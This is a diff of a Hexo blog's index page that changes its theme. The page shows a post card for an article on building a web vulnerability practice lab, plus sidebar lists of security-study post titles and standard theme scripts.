+            <!--<span class="badge">739</span>-->
+        </a>
+    </section>
+</div>
+     
+     <div class="article well clearfix article-body article-excerpt" data-aos="flip-up">
+    
+    <div class="data-article hidden-xs">
+        <span class="month">02月</span>
+        <span class="day">22</span>
+    </div>
+    <!-- 大型设备文章 -->
+    <section class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2019/02/22/腾讯云搭建Web漏洞靶场/">
+                    <span>本地虚拟机或腾讯云搭建Web漏洞靶场</span>
+                </a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/Web安全/">Web安全</a>
+                
+            </span>
+            
+            
+            <!-- TODO 添加评论统计 -->
+            <!--<span class="label label-gal">
+                <i class="fa fa-comments"></i>
+                <a href="/2019/02/22/腾讯云搭建Web漏洞靶场/#comments">739</a>
+            </span>-->
+        </div>
+        <div class="alert alert-gal article-body content-article">
+            <div class="item">
+                <a href="/2019/02/22/腾讯云搭建Web漏洞靶场/">
+                    <div class="img">
+                        
+                        <img src="/imgs/preview/preview1.jpg" alt="本地虚拟机或腾讯云搭建Web漏洞靶场">
+                    </div>
+                    <div class="info">
+                        
+                    </div>
+                </a>
+            </div>
+        </div>
+    </section>
+    <section class="visible-xs">
+        <div class="title-article">
+            <center>
+                <h4>
+                    <a href="/2019/02/22/腾讯云搭建Web漏洞靶场/">
+                        <span>本地虚拟机或腾讯云搭建Web漏洞靶场</span>
+                    </a>
+                </h4>
+            </center>
+        </div>
+        <p></p>
+        <center>
+            <i class="fa fa-calendar"></i> 2019-02-22
+        </center>
+        <p></p>
+        <p></p>
+        <center>
+            
+            <i class="fa fa-tags"></i>
+            
+            <a href="/tags/Web安全/">Web安全</a>
+            
+            
+            
+        </center>
+        <p></p>
+        <div class="alert alert-gal article-body content-article">
+            <p style="text-align: center;">
+                <a href="/2019/02/22/腾讯云搭建Web漏洞靶场/">
+                    
+                    <img src="/imgs/preview/preview1.jpg" alt="本地虚拟机或腾讯云搭建Web漏洞靶场">
+                </a>
+            </p>
+        </div>
+        
+        <a class="btn btn-danger pull-right read-more btn-block" href="/2019/02/22/腾讯云搭建Web漏洞靶场/">
+            阅读全文
+            <!--<span class="badge">739</span>-->
+        </a>
+    </section>
+</div>
+     
+</div>
+<!-- 前方最多7个 < 1 2 3 4 5 6 -->
+<!-- 前方超过第7页则分为 < 1 ... (n - 3) (n - 2) (n - 1) n, 此时前面为固定的6个 -->
 
-  
+<!-- 后方最多8个 (n + 1) 到 (n + 7) > -->
+<!-- 如果末页和当前页相差超过7, 此时后面为固定的6个, (n + 1) (n + 2) (n + 3) ... total > -->
+
+
+
+<div id="gal-pagination" class="clearfix">
+    <ul class="pagination pagination-gal pull-right">
+        
+        
+        
+        
+        <li class="current">
+            <span>1</span>
+        </li>
+        
+        
+        <li>
+            <a href="/page/2">2</a>
+        </li>
+        
+        
+        
+        <li class="next">
+            <a href="/page/2/">»</a>
+        </li>
+        
+    </ul>
+</div>
+
+<!-- 加上这段代码原因： gitment在首页加载时, 如果找不到对应的控件会报错，此处加上，同时设置为none，防止报错 -->   
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get" action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
 </aside>
-      </div>
-      <footer id="footer">
-  <div class="foot-box global-width">
-    &copy; 2019 桂ICP备18011307号-1 &nbsp;&nbsp;
-	All Rights Reserved Tahm.
-    <br>
-    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span id="busuanzi_container_site_pv">阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
-  </div>
-</footer>
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script src="/js/jquery-2.0.3.min.js"></script>
-
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-<script src="/js/script.js"></script>
-
-
-
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            桂ICP备18011307号-1
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140" alt="个人头像" class="author-image">
+            <p class="author-description"></p>
+        </div>
     </div>
-    <nav id="mobile-nav" class="mobile-nav-box">
-  <div class="mobile-nav-img mobile-nav-top"></div>
-  
-    <a href="/" class="mobile-nav-link">首页</a>
-  
-    <a href="/archives" class="mobile-nav-link">归档</a>
-  
-    <a href="/" class="mobile-nav-link">关于</a>
-  
-  <div class="mobile-nav-img  mobile-nav-bottom"></div>
-</nav>    
-  </div>
+</aside>
+    
+    <aside id="sidebar-recent_comments">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-comments"></i>
+            最新评论
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush"></ul>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/03/16/union联合查询/">union联合查询笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/03/16/Access手工注入/">Access手工注入</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/03/16/SQLMap笔记/">SQLMap笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/03/02/内网渗透/">内网渗透</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/03/01/2019年3月近期计划/">2019年3月近期计划</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/03/01/2019年计划/">2019年个人计划</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/02/25/II6-0文件解析漏洞/">II6.0文件解析漏洞</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/02/24/《百度白帽挖洞经验分享》笔记总结/">《百度白帽挖洞经验分享》笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/02/24/DNS是什么？DNS域名系统解释/">DNS是什么？DNS域名系统解释</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/02/22/腾讯云搭建Web漏洞靶场/">本地虚拟机或腾讯云搭建Web漏洞靶场</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/12/04/Myfirstblog/">我的第一篇博客</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/02/24/DNS是什么？DNS域名系统解释/">DNS是什么？DNS域名系统解释</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/12/04/hello-world/">Hello World</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/03/01/2019年计划/">2019年个人计划</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/02/24/《百度白帽挖洞经验分享》笔记总结/">《百度白帽挖洞经验分享》笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/03/01/2019年3月近期计划/">2019年3月近期计划</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/12/04/今天又是充满希望的一天/">今天又是充满希望的一天</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/12/04/httpd/">Linux 源码安装Apache</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/03/16/union联合查询/">union联合查询笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/02/22/腾讯云搭建Web漏洞靶场/">本地虚拟机或腾讯云搭建Web漏洞靶场</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+
+                
+                <li>
+                    <a href="/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+                
+            </ul>
+            <div class="tab-content">
+                
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+    <a href="/tags/Web安全/" style="font-size: 19.70308202696141px;" class="tag-cloud-link">Web安全</a>
+    
+    <a href="/tags/我想静静/" style="font-size: 12.495659627569994px;" class="tag-cloud-link">我想静静</a>
+    
+    <a href="/tags/计算机网络/" style="font-size: 18.79908349831115px;" class="tag-cloud-link">计算机网络</a>
+    
+    <a href="/tags/中间件安全/" style="font-size: 12.401400453192593px;" class="tag-cloud-link">中间件安全</a>
+    
+    <a href="/tags/Linux/" style="font-size: 17.99439690181533px;" class="tag-cloud-link">Linux</a>
+    
+    <a href="/tags/内网渗透/" style="font-size: 14.917101945931229px;" class="tag-cloud-link">内网渗透</a>
+    
+</div>
+                
+                
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="http://kdays.net/days/" target="_blank">KDays Forum</a>
+    </li>
+    
+    <li>
+        <a href="http://www.gal123.com/" target="_blank">绅士导航♂</a>
+    </li>
+    
+    <li>
+        <a href="http://www.moe123.com/" target="_blank">萌导航</a>
+    </li>
+    
+</div>
+                
+                
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://github.com/ZEROKISEKI/" target="_blank">Github</a>
+    </li>
+    
+    <li>
+        <a href="https://coding.net/u/SORA1" target="_blank">Coding</a>
+    </li>
+    
+    <li>
+        <a href="https://www.zhihu.com/people/aonosora/activities" target="_blank">知乎</a>
+    </li>
+    
+</div>
+                
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 桂ICP备18011307号-1 Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
 </body>
+<script src="/js/activate-power-mode.js"></script>
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
 </html>
